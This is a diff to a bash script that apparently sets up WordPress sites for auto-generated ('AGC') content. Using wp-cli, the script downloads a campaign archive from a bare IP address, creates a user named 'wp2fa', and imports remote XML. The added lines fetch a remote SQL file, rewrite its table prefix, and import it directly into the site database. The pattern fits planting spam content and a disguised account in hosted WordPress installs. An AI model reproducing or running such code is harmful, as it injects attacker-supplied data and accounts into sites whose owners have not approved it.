@@ -8,7 +8,7 @@ _INSTALLWP() {
 	owner=$(echo -e "$(pwd)" | cut -d "/" -f3)
 	source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
 	xml_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.xml"
-
+	sql_agc=""
 	if [[ $(id | grep "root" ) ]]; then extra="--allow-root"; else extra=""; fi
 
 	echo -e ""
@@ -57,6 +57,8 @@ _INSTALLWP() {
 	wget ${xml_agc} -O agc.xml
 	php wp-cli.phar import agc.xml --authors=create $extra
 
+
+
 	#	ENTERING KEYWORD
 	#php wp-cli.phar db query "DROP TABLE IF EXISTS $(php wp-cli.phar db prefix $extra)wp_api_keys" $extra
 
@@ -78,7 +80,9 @@ _INSTALLAGC() {
 	username="wp2fa"
 	source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
 	xml_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.xml"
-	
+	sql_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.txt"
+
+
 	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
 
 	#	Creating User
@@ -94,6 +98,9 @@ _INSTALLAGC() {
 	php wp-cli.phar plugin install wordpress-importer --activate
 	wget ${xml_agc} -O agc.xml
 	php wp-cli.phar import agc.xml --authors=create
+	wget ${sql_agc} -O agc.sql
+	sed -i -e 's/blogwpx_/$(php wp-cli.phar db prefix $extra)/g' agc.sql
+	php wp-cli.phar db import agc.sql
 }
 
 
